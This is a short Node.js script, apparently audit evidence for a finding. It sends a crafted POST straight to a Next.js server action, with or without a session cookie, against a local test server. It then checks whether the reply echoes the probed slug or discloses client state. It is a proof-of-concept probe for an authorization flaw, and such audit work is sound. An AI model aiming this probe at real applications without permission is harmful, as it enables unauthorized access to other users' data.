// Finding 5 evidence: direct POST of `lookupClient`, which takes
// (prevState, formData), with and without a platform session.
import { encodeReply } from "next/dist/compiled/react-server-dom-turbopack/client.node.js";

const [, , actionId, slug, cookie] = process.argv;

const fd = new FormData();
fd.append("slug", slug);

const body = await encodeReply([{ error: null }, fd]);
const headers = { "Next-Action": actionId };
if (cookie) headers.Cookie = cookie;
if (typeof body === "string") headers["Content-Type"] = "text/plain;charset=UTF-8";

const res = await fetch("http://localhost:3456/", {
  method: "POST",
  headers,
  body,
  redirect: "manual",
});
const text = await res.text();

console.log("STATUS", res.status, "| X-ACTION-REDIRECT", res.headers.get("x-action-redirect") ?? "-");
const state = text.match(/"error":[^,}]*/g);
console.log("returned state:", state ? state.join(" | ") : "(none)");
console.log("echoes the probed slug?", text.includes(slug) ? "YES" : "no");
console.log(
  "discloses client state?",
  /template assigned|No active client|no valid template/.test(text) ? "YES" : "no",
);
